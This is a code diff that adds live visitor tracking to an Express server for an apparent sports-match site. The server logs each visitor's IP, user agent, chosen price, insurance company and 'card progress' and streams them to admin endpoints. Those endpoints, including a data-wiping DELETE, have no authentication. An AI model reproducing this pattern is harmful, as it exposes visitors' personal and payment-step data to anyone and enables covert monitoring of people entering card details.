@@ -10,6 +10,167 @@ const db = new sqlite3.Database('./database.db', (err) => {
     else console.log('Connected to database');
 });
 
+// ==========================================
+// REAL-TIME VISITOR TRACKING SYSTEM
+// ==========================================
+
+// In-memory store for active users
+const activeUsers = {};
+const sseClients = [];
+
+// Heartbeat timeout (30 seconds)
+const HEARTBEAT_TIMEOUT = 30000;
+
+// Clean up inactive users periodically
+setInterval(() => {
+    const now = Date.now();
+    Object.keys(activeUsers).forEach(sessionId => {
+        if (now - activeUsers[sessionId].lastSeen > HEARTBEAT_TIMEOUT) {
+            delete activeUsers[sessionId];
+        }
+    });
+    // Broadcast updated list to all SSE clients
+    broadcastUpdate();
+}, 10000);
+
+// Broadcast updates to all SSE clients
+function broadcastUpdate() {
+    const data = JSON.stringify(Array.from(Object.entries(activeUsers)).map(([id, user]) => ({
+        sessionId: id,
+        ...user
+    })));
+    sseClients.forEach(client => {
+        try {
+            client.write(`data: ${data}\n\n`);
+        } catch (e) {
+            // Client disconnected
+        }
+    });
+}
+
+// SSE Endpoint for Admin Dashboard
+app.get('/api/admin/visitor-stream', (req, res) => {
+    res.setHeader('Content-Type', 'text/event-stream');
+    res.setHeader('Cache-Control', 'no-cache');
+    res.setHeader('Connection', 'keep-alive');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    
+    // Send initial data
+    const initialData = JSON.stringify(Array.from(Object.entries(activeUsers)).map(([id, user]) => ({
+        sessionId: id,
+        ...user
+    })));
+    res.write(`data: ${initialData}\n\n`);
+    
+    // Add to clients list
+    sseClients.push(res);
+    
+    // Keep connection alive
+    const keepAlive = setInterval(() => {
+        res.write(': keepalive\n\n');
+    }, 20000);
+    
+    req.on('close', () => {
+        clearInterval(keepAlive);
+        const index = sseClients.indexOf(res);
+        if (index > -1) sseClients.splice(index, 1);
+    });
+});
+
+// Visitor tracking endpoint (called by client pages)
+app.post('/api/track-activity', (req, res) => {
+    const { sessionId, page, selectedPrice, selectedTier, country, insuranceCompany, cardProgress } = req.body;
+    
+    if (!sessionId) {
+        return res.status(400).json({ error: 'sessionId required' });
+    }
+    
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const ip = req.ip || req.connection.remoteAddress || 'Unknown';
+    
+    activeUsers[sessionId] = {
+        page: page || 'unknown',
+        selectedPrice: selectedPrice || null,
+        selectedTier: selectedTier || null,
+        country: country || null,
+        insuranceCompany: insuranceCompany || null,
+        cardProgress: cardProgress || null,
+        lastSeen: Date.now(),
+        userAgent: userAgent,
+        ip: ip
+    };
+    
+    // Broadcast immediately to all SSE clients
+    broadcastUpdate();
+    
+    res.json({ success: true, activeCount: Object.keys(activeUsers).length });
+});
+
+// Analytics summary endpoint
+app.get('/api/admin/analytics-summary', (req, res) => {
+    const summary = {
+        totalActive: Object.keys(activeUsers).length,
+        byPage: {},
+        byCountry: {},
+        byTier: {},
+        recentActivity: []
+    };
+    
+    // Group by page
+    Object.values(activeUsers).forEach(user => {
+        const page = user.page || 'unknown';
+        summary.byPage[page] = (summary.byPage[page] || 0) + 1;
+        
+        // Group by country
+        if (user.country) {
+            summary.byCountry[user.country] = (summary.byCountry[user.country] || 0) + 1;
+        }
+        
+        // Group by tier
+        if (user.selectedTier) {
+            summary.byTier[user.selectedTier] = (summary.byTier[user.selectedTier] || 0) + 1;
+        }
+    });
+    
+    // Recent activity (last 10)
+    const entries = Object.entries(activeUsers)
+        .sort((a, b) => b[1].lastSeen - a[1].lastSeen)
+        .slice(0, 10);
+    
+    summary.recentActivity = entries.map(([id, user]) => ({
+        sessionId: id,
+        ...user
+    }));
+    
+    res.json(summary);
+});
+
+// Clear analytics endpoint
+app.delete('/api/admin/clear-analytics', (req, res) => {
+    const count = Object.keys(activeUsers).length;
+    Object.keys(activeUsers).forEach(key => delete activeUsers[key]);
+    
+    // Also clear database visitors table if needed
+    db.run('DELETE FROM visitors', [], (err) => {
+        if (err) console.error('Error clearing visitors:', err.message);
+    });
+    
+    res.json({ success: true, clearedCount: count });
+});
+
+// Get all active users (for initial load)
+app.get('/api/admin/active-users', (req, res) => {
+    const users = Array.from(Object.entries(activeUsers)).map(([id, user]) => ({
+        sessionId: id,
+        ...user
+    }));
+    res.json(users);
+});
+
+// ==========================================
+// END VISITOR TRACKING SYSTEM
+// ==========================================
+
 // Clean corrupted flag data on startup
 db.serialize(() => {
     db.all("SELECT id, home_team_flag, away_team_flag FROM matches", [], (err, rows) => {
